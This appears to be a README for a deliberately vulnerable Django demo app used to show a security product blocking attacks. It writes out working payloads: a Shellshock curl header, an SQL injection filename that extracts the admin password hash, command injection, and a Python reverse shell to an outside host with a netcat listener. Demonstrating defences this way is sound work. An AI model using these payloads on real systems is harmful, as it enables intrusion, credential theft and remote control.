# test
## test
### test

Pre-Requisites for Usage
	• Docker
	• A Cloud One Application Security account
	
Usage Instructions
	1. Download & run the container:

docker run --rm -d -p 8000:8000 --name djangonv-app-protect -e TREND_AP_KEY=??? -e TREND_AP_SECRET=??? andrefernandes86/demo-cloudone-appprotect:latest

https://cloudone.trendmicro.com
http://127.0.0.1:8000

Open Redirect Vulnerability
http://127.0.0.1:8000/taskManager/logout?redirect=http://www.yahoo.com 

Malicious Payload (Intrusion Prevention)
curl -H "User-Agent: () { :; }; /bin/eject" http://127.0.0.1:8000 

Remote Command Execution
1. Go to http://127.0.0.1:8000/ and click "Login"
2. Login to the application
user / user123
3. Click the link for the "demo project".
4. Click the "Add files" link.
5. Pick any file from your local computer, and use the following payload for the filename:
'||(SELECT password FROM auth_user WHERE username='admin')||'
Once this exploit has succeeded, you should see the file in the project file list. The filename contains the MD5 hash of the password of the admin user (after the "md5$"). You should be able to crack this password using JTR or rainbow tables or other.

OS Command Injection:
In the same place as in for the attack above ("My Projects" --> project you created, add files). Also pick any file from your local computer, but for the payload use:

An innocent sleep statement (to demonstrate that we can run any command):

some_file_name; sleep 1m

You'll notice that (without Cloud One Application Security), the browser will "sleep" for 1 minute.
For a more "interesting" demonstration, you can inject a python reverse shell. Reverse shells are commonly used to remotely control the locally exploited application.

Also in the same location within the application, pick any file from your local computer, but for the payload use:

some_file_name; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.64.1",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Note: You'll need to set up a listener on an external host in order for this reverse shell to actually connect. In the above case the host is at 192.168.64.1 and is listening on port 8001.

For example:
nc -nvlp 8001

Note: netcat syntax may vary from system to system.
